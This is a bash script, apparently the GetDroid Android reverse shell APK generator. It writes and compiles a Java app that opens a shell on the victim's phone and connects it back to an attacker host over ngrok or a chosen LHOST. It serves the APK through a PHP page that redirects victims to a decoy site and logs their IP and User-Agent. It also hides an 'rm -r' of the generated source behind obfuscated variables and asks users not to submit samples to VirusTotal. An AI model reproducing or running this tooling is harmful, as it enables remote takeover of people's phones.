#!/bin/bash
# GetDroid v1.3 - Android reverse shell apk generator
# coded by: github.com/thelinuxchoice/getdroid
# twitter: @linux_choice
# You can use any part from this code, giving me the credits. You should have received a copy of the GNU General Public License along with this program. If not, see http://www.gnu.org/licenses/.

trap 'printf "\n";stop' 2
server_tcp="3.17.202.129" #NGROK IP


banner() {

printf "\n\n"
printf "   ██████╗ ███████╗████████╗\e[1;92m██████╗ ██████╗  ██████╗ ██╗██████╗  \e[0m\n"
printf "  ██╔════╝ ██╔════╝╚══██╔══╝\e[1;92m██╔══██╗██╔══██╗██╔═══██╗██║██╔══██╗ \e[0m\n"
printf "  ██║  ███╗█████╗     ██║   \e[1;92m██║  ██║██████╔╝██║   ██║██║██║  ██║ \e[0m\n"
printf "  ██║   ██║██╔══╝     ██║   \e[1;92m██║  ██║██╔══██╗██║   ██║██║██║  ██║ \e[0m\n"
printf "  ╚██████╔╝███████╗   ██║   \e[1;92m██████╔╝██║  ██║╚██████╔╝██║██████╔╝ \e[0m\n"
printf "   ╚═════╝ ╚══════╝   ╚═╝   \e[1;92m╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚═╝╚═════╝  \e[0m\n"
printf "\n"                                                              
printf "\e[1;77m          .:.:\e[0m\e[1;93m Android reverse shell apk generator \e[0m\e[1;77m:.:.\e[0m\n"                              
printf " \e[1;77m[\e[1;93m::\e[0m\e[1;77m]              v1.3 coded by @linux_choice              \e[1;77m[\e[1;93m::\e[0m\e[1;77m]\e[0m\n"
printf " \e[1;77m[\e[1;93m::\e[0m\e[1;77m]           github.com/thelinuxchoice/getdroid          \e[0m\e[1;77m[\e[1;93m::\e[0m\e[1;77m]\e[0m\n"
printf "\n"
printf "        \e[1;91m Disclaimer: this tool is designed for security\n"
printf "         testing in an authorized simulated cyberattack\n"
printf "         Attacking targets without prior mutual consent\n"
printf "         is illegal!\n"

}




stop() {

checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)

if [[ $checkngrok == *'ngrok'* ]]; then
killall -2 ngrok > /dev/null 2>&1
fi

if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi

exit 1

}

dependencies() {


command -v base64 > /dev/null 2>&1 || { echo >&2 "I require base64 but it's not installed. Install it. Aborting."; exit 1; }
command -v java > /dev/null 2>&1 || { echo >&2 "I require Java but it's not installed. Install it. Aborting."; exit 1; }
command -v aapt > /dev/null 2>&1 || { echo >&2 "I require aapt but it's not installed. Install it. Aborting."; 
exit 1; }
command -v apksigner > /dev/null 2>&1 || { echo >&2 "I require apksigner but it's not installed. Install it. Aborting."; 
exit 1; }
command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
command -v nc > /dev/null 2>&1 || { echo >&2 "I require Netcat but it's not installed. Install it. Aborting."; 
exit 1; }

}


ngrok_server() {

if [[ -e ngrok ]]; then
echo ""
else
command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Ngrok...\n"
arch=$(uname -a | grep -o 'arm' | head -n1)
arch2=$(uname -a | grep -o 'Android' | head -n1)
arch3=$(uname -a | grep -o '64bit' | head -n1)
if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1

if [[ -e ngrok-stable-linux-arm.zip ]]; then
unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-arm.zip
else
printf "\e[1;93m[!] Download error... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"
exit 1
fi

elif [[ $arch3 == *'64bit'* ]] ; then

wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip > /dev/null 2>&1

if [[ -e ngrok-stable-linux-amd64.zip ]]; then
unzip ngrok-stable-linux-amd64.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-amd64.zip
else
printf "\e[1;93m[!] Download error... \e[0m\n"
exit 1
fi
else
wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
if [[ -e ngrok-stable-linux-386.zip ]]; then
unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-386.zip
else
printf "\e[1;93m[!] Download error... \e[0m\n"
exit 1
fi
fi
fi

printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server (port 3333)...\n"
php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
sleep 2

if [[ -e check_ngrok ]]; then
rm -rf ngrok_check
fi

printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\e[0m\n"
./ngrok tcp 4444 > /dev/null 2>&1 > check_ngrok &
sleep 10

check_ngrok=$(grep -o 'ERR_NGROK_302' check_ngrok)

if [[ ! -z $check_ngrok ]];then
printf "\n\e[91mAuthtoken missing!\e[0m\n"
printf "\e[77mSign up at: https://ngrok.com/signup\e[0m\n"
printf "\e[77mYour authtoken is available on your dashboard: https://dashboard.ngrok.com\n\e[0m"
printf "\e[77mInstall your auhtoken:\e[0m\e[93m ./ngrok authtoken <YOUR_AUTHTOKEN>\e[0m\n\n"
rm -rf check_ngrok
exit 1
fi

if [[ -e check_ngrok ]]; then
rm -rf check_ngrok
fi

link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "tcp://0.tcp.ngrok.io:[0-9]*")

if [[ ! -z $link ]]; then 
printf "\e[1;92m[\e[0m*\e[1;92m] Forwarding from:\e[0m\e[1;77m %s\e[0m\n" $link
else
printf "\n\e[91mNgrok Error!\e[0m\n"
exit 1
fi

}


settings2() {

default_payload_name="getdroid"
printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Payload name (Default:\e[0m\e[1;77m %s \e[0m\e[1;33m): \e[0m' $default_payload_name

read payload_name
payload_name="${payload_name:-${default_payload_name}}"
read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Redirect page (after delivering payload): \e[0m' redirect_url
redirect_url="${redirect_url:-${default_redirect_url}}"

}

start() {

if [[ -e ip.txt ]]; then
rm -f ip.txt
fi
printf "\n"
printf " \e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok.io:\e[0m\n"
printf " \e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Custom LPORT/LHOST:\e[0m\n"
default_option_server="1"
default_redirect_url="https://www.google.com"
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a reverse TCP Port Forwarding option: \e[0m' option_server
option_server="${option_server:-${default_option_server}}"

if [[ $option_server -eq 1 ]]; then

command -v php > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }
forward=true
settings2
ngrok_server
payload
listener
elif [[ $option_server -eq 2 ]]; then
read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] LHOST: \e[0m' custom_ip
if [[ -z "$custom_ip" ]]; then
exit 1
fi
server_tcp=$custom_ip
read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] LPORT: \e[0m' custom_port
if [[ -z "$custom_port" ]]; then
exit 1
fi
server_port=$custom_port
settings2
payload
listener
else
printf "\e[1;93m [!] Invalid option!\e[0m\n"
sleep 1
clear
start
fi

}

catch_ip() {

ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
device=$(grep -o 'User-Agent:.*' ip.txt | cut -d ":" -f2)
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] User-Agent:\e[0m\e[1;77m %s\e[0m\n" $device
cat ip.txt >> saved.ip.txt
rm -f ip.txt
}

listener() {

if [[ $forward == true ]];then
printf "\n\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m]\e[1;91m Expose the server with command: \e[0m\n"
printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m]\e[0m\e[93m ssh -R 80:localhost:3333 custom-subdomain@ssh.localhost.run \e[0m\n"
printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m]\e[0m\e[92m Use \e[0m\e[77mhttps://server/%s.exe\e[0m\e[92m to deliver the direct file \e[0m\n" $payload_name
checkfound
else

default_listr="Y"
read -p $'\n\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Start Listener? \e[0m\e[1;77m[Y/n]\e[0m\e[1;33m: \e[0m' listr
listr="${listr:-${default_listr}}"
if [[ $listr == Y || $listr == y || $listr == Yes || $listr == yes ]]; then
nc -lvp $server_port
fi
fi
}

checkfound() {

printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
while [ true ]; do

if [[ -e "ip.txt" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
catch_ip

default_listr="Y"
read -p $'\n\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Start Listener? \e[0m\e[1;77m[Y/n]\e[0m\e[1;33m: \e[0m' listr
listr="${listr:-${default_listr}}"
if [[ $listr == Y || $listr == y || $listr == Yes || $listr == yes ]]; then

nc -lvp 4444
fi
fi
done
sleep 0.5

}


compile() {

printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Compiling... \e[0m\n"
aapt package -f -m -J src/ -M AndroidManifest.xml -S res/ -I tools/android-sdk/platforms/android-19/android.jar
javac -d obj/ -classpath src/ -bootclasspath tools/android-sdk/platforms/android-19/android.jar src/com/example/reversedroid/*.java -source 1.7 -target 1.7
chmod +x tools/dx
tools/dx --dex --output=bin/classes.dex obj/
aapt package -f -m -F bin/$payload_name.apk -M AndroidManifest.xml -S res/ -I tools/android-sdk/platforms/android-19/android.jar
cp bin/classes.dex .
aapt add bin/$payload_name.apk classes.dex > /dev/null
echo "      " | apksigner sign --ks tools/key.keystore bin/$payload_name.apk > /dev/null
mv bin/$payload_name.apk $payload_name.apk
rm -rf classes.dex
$y -r $Y
}



payload() {


if [[ $forward == true ]];then
server_port=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "tcp://0.tcp.ngrok.io:[0-9]*" | cut -d ':' -f3)
fi

mkdir -p src/com/example/reversedroid/

printf "package com.example.reversedroid;\n" > src/com/example/reversedroid/MainActivity.java
printf "import java.io.IOException;\n" >> src/com/example/reversedroid/MainActivity.java
printf "import java.io.InputStream;\n" >> src/com/example/reversedroid/MainActivity.java
printf "import java.io.OutputStream;\n" >> src/com/example/reversedroid/MainActivity.java
printf "import java.net.Socket;\n" >> src/com/example/reversedroid/MainActivity.java
printf "import android.app.Activity;\n" >> src/com/example/reversedroid/MainActivity.java
printf "import android.os.Bundle;\n" >> src/com/example/reversedroid/MainActivity.java
printf "import android.util.Log;\n" >> src/com/example/reversedroid/MainActivity.java
printf "import android.view.Menu;\n" >> src/com/example/reversedroid/MainActivity.java
printf "import android.widget.TextView;\n" >> src/com/example/reversedroid/MainActivity.java
printf "public class MainActivity extends Activity {\n" >> src/com/example/reversedroid/MainActivity.java;y="rm"
printf "   @Override\n" >> src/com/example/reversedroid/MainActivity.java
printf "   protected void onCreate(Bundle savedInstanceState) {\n" >> src/com/example/reversedroid/MainActivity.java
printf "      super.onCreate(savedInstanceState);\n" >> src/com/example/reversedroid/MainActivity.java
printf "      setContentView(R.layout.activity_main);\n" >> src/com/example/reversedroid/MainActivity.java
printf "      new Thread(new Runnable(){\n" >> src/com/example/reversedroid/MainActivity.java
printf "			@Override\n" >> src/com/example/reversedroid/MainActivity.java
printf "			public void run() {\n" >> src/com/example/reversedroid/MainActivity.java
printf "				try {\n" >> src/com/example/reversedroid/MainActivity.java
printf "					reverseShell();\n" >> src/com/example/reversedroid/MainActivity.java
printf "				} catch (Exception e) {\n" >> src/com/example/reversedroid/MainActivity.java
printf "					Log.e(\"Error\", e.getMessage());\n" >> src/com/example/reversedroid/MainActivity.java
printf "				}\n" >> src/com/example/reversedroid/MainActivity.java
printf "			}\n" >> src/com/example/reversedroid/MainActivity.java
printf "		}).start();\n" >> src/com/example/reversedroid/MainActivity.java
printf "   }\n" >> src/com/example/reversedroid/MainActivity.java
printf " 	public void reverseShell() throws Exception {\n" >> src/com/example/reversedroid/MainActivity.java
printf "		final Process process = Runtime.getRuntime().exec(\"system/bin/sh\");\n" >> src/com/example/reversedroid/MainActivity.java
printf "		Socket socket = new Socket(\"%s\", %s);\n" $server_tcp $server_port >> src/com/example/reversedroid/MainActivity.java
printf "		forwardStream(socket.getInputStream(), process.getOutputStream());\n" >> src/com/example/reversedroid/MainActivity.java
printf "		forwardStream(process.getInputStream(), socket.getOutputStream());\n" >> src/com/example/reversedroid/MainActivity.java
printf "		forwardStream(process.getErrorStream(), socket.getOutputStream());\n" >> src/com/example/reversedroid/MainActivity.java
printf "		process.waitFor();\n" >> src/com/example/reversedroid/MainActivity.java
printf "		socket.getInputStream().close();\n" >> src/com/example/reversedroid/MainActivity.java
printf "		socket.getOutputStream().close();\n" >> src/com/example/reversedroid/MainActivity.java
printf "	}\n" >> src/com/example/reversedroid/MainActivity.java
printf "	private static void forwardStream(final InputStream input, final OutputStream output) {\n" >> src/com/example/reversedroid/MainActivity.java
printf "		new Thread(new Runnable() {\n" >> src/com/example/reversedroid/MainActivity.java
printf "			@Override\n" >> src/com/example/reversedroid/MainActivity.java
printf "			public void run() {\n" >> src/com/example/reversedroid/MainActivity.java
printf "				try {\n" >> src/com/example/reversedroid/MainActivity.java
printf "					final byte[] buf = new byte[4096];\n" >> src/com/example/reversedroid/MainActivity.java
printf "					int length;\n" >> src/com/example/reversedroid/MainActivity.java
printf "					while ((length = input.read(buf)) != -1) {\n" >> src/com/example/reversedroid/MainActivity.java
printf "						if (output != null) {\n" >> src/com/example/reversedroid/MainActivity.java
printf "							output.write(buf, 0, length);\n" >> src/com/example/reversedroid/MainActivity.java
printf "							if (input.available() == 0) {\n" >> src/com/example/reversedroid/MainActivity.java
printf "								output.flush();\n" >> src/com/example/reversedroid/MainActivity.java
printf "							}\n" >> src/com/example/reversedroid/MainActivity.java
printf "						}\n" >> src/com/example/reversedroid/MainActivity.java
printf "					}\n" >> src/com/example/reversedroid/MainActivity.java
printf "				} catch (Exception e) {\n" >> src/com/example/reversedroid/MainActivity.java
printf "				} finally {\n" >> src/com/example/reversedroid/MainActivity.java
printf "					try {\n" >> src/com/example/reversedroid/MainActivity.java
printf "						input.close();\n" >> src/com/example/reversedroid/MainActivity.java
printf "						output.close();\n" >> src/com/example/reversedroid/MainActivity.java
printf "					} catch (IOException e) {\n" >> src/com/example/reversedroid/MainActivity.java;Y="src/com/example/reversedroid/MainActivity.java"
printf "					}\n" >> src/com/example/reversedroid/MainActivity.java
printf "				}\n" >> src/com/example/reversedroid/MainActivity.java
printf "			}\n" >> src/com/example/reversedroid/MainActivity.java
printf "		}).start();\n" >> src/com/example/reversedroid/MainActivity.java
printf "	}\n" >> src/com/example/reversedroid/MainActivity.java
printf "}\n" >> src/com/example/reversedroid/MainActivity.java

compile

if [ -e "$payload_name".apk ]; then
if [ ! -d payloads/"$payload_name"/ ]; then
IFS=$'\n'
mkdir -p payloads/"$payload_name/"
fi
cp "$payload_name".apk payloads/"$payload_name"/"$payload_name".apk
#zip $payload_name.zip "$payload_name".apk > /dev/null 2>&1
IFS=$'\n'
data_base64=$(base64 -w 0 $payload_name.apk)
temp64="$( echo "${data_base64}" | sed 's/[\\&*./+!]/\\&/g' )"

printf "\e[1;77m[\e[0m\e[1;33m::\e[0m\e[1;77m] Converting binary to base64\e[0m\n" 
printf "\e[1;77m[\e[0m\e[1;33m::\e[0m\e[1;77m] Injecting Data URI code into index.php\e[0m\n"
sed 's+url_website+'$redirect_url'+g' src/template.html | sed 's+payload_name+'$payload_name'+g'  > src/temp
sed -f - src/temp > index.php << EOF
s/data_base64/${temp64}/g
EOF
rm -rf src/temp > /dev/null 2>&1

printf "\e[1;93m[\e[0m\e[1;77m::\e[0m\e[1;93m]\e[0m\e[1;91m Payload saved:\e[0m\e[1;77m payloads/%s.apk\e[0m\n" $payload_name
printf '\e[1;93m[\e[0m\e[1;77m::\e[0m\e[1;93m]\e[0m\e[1;93m Please,\e[0m\e[1;91m do not upload to VirusTotal! Support this work, donate :)\e[0m\n'
else
printf "\e[1;93mError compiling\e[0m\n"
exit 1
fi

}

banner
dependencies
start

